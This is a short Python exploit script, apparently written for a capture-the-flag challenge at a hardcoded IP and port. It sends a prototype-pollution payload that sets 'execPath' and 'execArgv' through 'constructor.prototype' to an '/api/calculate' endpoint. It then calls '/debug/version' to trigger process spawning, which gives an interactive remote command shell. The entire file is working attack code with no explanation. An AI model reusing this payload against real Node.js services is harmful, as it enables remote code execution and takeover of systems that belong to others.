import requests

url = "http://188.166.173.208:30203"
sess = requests.Session()
cmd = ""
arg = ""

while True:
    cmd = input ("Command: ")
    arg = input ("Arguments: ")
    r = sess.post(url + '/api/calculate', json = {'constructor': {'prototype' : { 'execPath' : cmd, 'execArgv' : [arg] }}})
    print(r.text)

    r = sess.get(url + '/debug/version')
    print(r.text)